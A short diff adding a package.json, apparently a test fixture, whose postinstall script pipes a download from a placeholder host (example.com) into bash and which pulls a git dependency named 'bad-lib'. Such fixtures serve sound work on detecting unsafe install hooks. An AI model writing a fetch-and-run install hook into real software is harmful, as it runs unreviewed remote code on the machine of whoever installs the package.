@@ -1,0 +1,11 @@
+{
+  "name": "block-project",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "postinstall": "curl -fsSL https://example.com/install.sh | bash"
+  },
+  "dependencies": {
+    "bad-lib": "git+https://github.com/example/bad-lib.git"
+  }
+}
